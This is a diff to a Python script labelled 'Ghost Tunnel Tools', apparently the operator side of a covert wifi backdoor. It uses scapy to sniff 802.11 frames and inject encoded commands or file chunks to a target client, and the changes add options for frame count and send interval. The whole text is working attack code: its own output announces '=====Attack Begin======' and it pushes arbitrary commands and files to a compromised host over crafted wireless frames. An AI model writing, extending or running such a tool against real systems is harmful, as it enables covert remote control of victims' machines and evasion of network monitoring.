@@ -56,14 +56,14 @@ class Action1:
                 self.ReceiveHash = data[index+3:index+11]
                 ct_addr2 = packet.addr2
                 if(self.SendHash != self.ReceiveHash ):
-		    if(time.time() - self.time >4 ):
+		    if(time.time() - self.time > timeInterval ):
                         self.number += 1
                         if(self.SendHash == None):
                             self.SendHash = Tools.getTimeHash()
                         cmd_bin = Tools().CMDEncode("ccc"+self.SendHash+SendCMD)
                         print("Round ["+str(self.number)+"]  : Context is {"+cmd_bin+"}   "),
                         response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
-                        sendp(response_frame, iface="wlan0", count=450 + 50 * self.number)
+                        sendp(response_frame, iface="wlan0", count=PackageCount + 50 * self.number)
                         self.time = time.time()
 		else:
                     self.SendHash = None;
@@ -105,7 +105,7 @@ class Action2:
                 self.ReceiveHash = data[index+3:index+11]
                 ct_addr2 = packet.addr2
                 if(self.SendHash != self.ReceiveHash ):
-		    if(time.time() - self.time >4 ):
+		    if(time.time() - self.time > timeInterval ):
                         self.number += 1
                         if(self.SendHash == None):
                             self.SendHash = Tools.getTimeHash()
@@ -113,7 +113,7 @@ class Action2:
 
                         print("Round ["+str(self.CurrentIndex+1)+"/"+str(self.filelen)+" - "+str(self.number)+"] , "+str(len(self.filebuf[self.CurrentIndex]))+" bytes ,"),
                         response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
-                        sendp(response_frame, iface="wlan0", count=450 + 50 * self.number)
+                        sendp(response_frame, iface="wlan0", count=PackageCount + 50 * self.number)
                         self.time = time.time()
 		else:
                     self.SendHash = None
@@ -125,56 +125,106 @@ class Action2:
             
 
 
-SendCMD = ""
-opts, args = getopt.getopt(sys.argv[1:], "hc:f:")
+SendCMD = ""  #Command Mode is COMMAND, File Mode is FILE PATH
+PackageCount = 450 #Send frame amount firstly
+timeInterval = 4 # unit: second
+AttackMode = None
+
+opts, args = getopt.getopt(sys.argv[1:], "hc:f:p:t:")
 for op, value in opts:
     if op in ("-c"):
-        #try:
-            SendCMD += value
-            for j in args:
-                SendCMD = SendCMD+" "+j
-            print(SendCMD)
-            act1 = Action1()
-            #print("You input command is :[" + SendCMD+"]")
-            print("=====Attack Begin======")
-            print("Sniff Monitor...")
-            sniff(iface="wlan0", prn=act1.Handle)
-        #except:
-            #print("Please try again later")
-            pass
+        act1 = Action1()
+        #-------get Command--------
+        SendCMD += value
+        for j in args:
+            SendCMD = SendCMD+" "+j
+        #-------- param Analysis FINISH ! --------
+        AttackMode = "Command"
+        print("You input command is :[" + SendCMD+"]")
+
     elif op in ("-f"):
-        #try:
-            SendCMD += value
-            for j in args:
-                SendCMD = SendCMD+" "+j
-            act2 = Action2()
-            CMD2fileName = SendCMD.split("/")[-1]
-            if(len(CMD2fileName) <= 15):
-                act2.setfilename(CMD2fileName)
-            else:
-                print("filename so long!")
-                exit(1)
+        act2 = Action2()
+        #-------get send file path--------
+        SendCMD = value
+        CMD2fileName = SendCMD.split("/")[-1]
+        if(len(CMD2fileName) <= 15):
+            act2.setfilename(CMD2fileName)
+        else:
+            print("filename so long!")
+            exit(1)
+	#--------translate from \n to \r\n && slice file--------
+        with open(SendCMD) as f:
+            lines = f.readlines() 
+        with open(SendCMD+"_tmp","w") as f_w:
+            for line in lines:
+                if "\n" in line:
+                    line = line.replace("\n","\r\n")
+                f_w.write(line)
+        act2.slicingFile(SendCMD+"_tmp")
+        os.remove(SendCMD+"_tmp")
+        #-------get the number of send frame firstly -------
+        args_tmp = ""
+        for j in args:
+            args_tmp = args_tmp+" "+j
+        try:
+            sendCount = int(args_tmp.split(" ")[1])
+        except:
+            sendCount = 1
+        if(sendCount <= act2.filelen):
+            act2.CurrentIndex = sendCount-1
+        else:
+            print("[ERROR] SendCount > file len")
+            exit(1)
+        #-------- param Analysis FINISH ! --------
+        AttackMode = "File"
+        print("input file is :[" + SendCMD+"] , the number of send frame firstly is :["+str(sendCount)+"]")
 
-            with open(SendCMD) as f:
-                lines = f.readlines() 
-            with open(SendCMD+"_tmp","w") as f_w:
-                for line in lines:
-                    if "\n" in line:
-                        line = line.replace("\n","\r\n")
-                    f_w.write(line)
-            act2.slicingFile(SendCMD+"_tmp")
-            os.remove(SendCMD+"_tmp")
+    elif op in ("-p"):
+        #-------- get the number of Send Package --------
+        args_tmp = value
+        try:
+            PackageCount = int(args_tmp.split(" ")[0]) - 50
+        except:
+            PackageCount = 450    
+        #-------- param Analysis FINISH ! --------  
+        if(PackageCount < 0):
+            print("[ERROR] the min of PackageCount is 50 !!")
+            PackageCount = 450
+	else:
+            print("The value of the send package firstly is :" + str(PackageCount+50) )
 
-            print("You input file is :[" + SendCMD+"]")
-            print("=====Attack Begin======")
-            print("Sniff Monitor...")
-            sniff(iface="wlan0", prn=act2.Handle)
-        #except:
-            #print("Please try again later")
-            pass        
+    elif op in ("-t"):
+        #-------- get the Interval time --------
+        args_tmp = value
+        try:
+            timeInterval = float(args_tmp.split(" ")[0])
+        except:
+            timeInterval = 4  
+        #-------- param Analysis FINISH ! --------  
+        if(timeInterval < 0):
+            print("[ERROR] the min of Interval time is 0 !!")
+            timeInterval = 4
+	else:
+            print("The Interval time is :" + str(timeInterval) )
+
     elif op in ("-h"):
         print('''
         ----------------------------------
            Ghost Tunnel Tools Manual...
         ----------------------------------
+        -h
+        -c
+        -f
+        [-t]  unit:Second
+        [-p]
         ''')
+       
+print("=====Attack Begin======")
+print("Sniff Monitor...")
+try:
+    if(AttackMode == "Command"):
+        sniff(iface="wlan0", prn=act1.Handle)
+    elif(AttackMode == "File"):
+        sniff(iface="wlan0", prn=act2.Handle)        
+except Exception as e:
+    print("[ERROR]:"+str(e))   
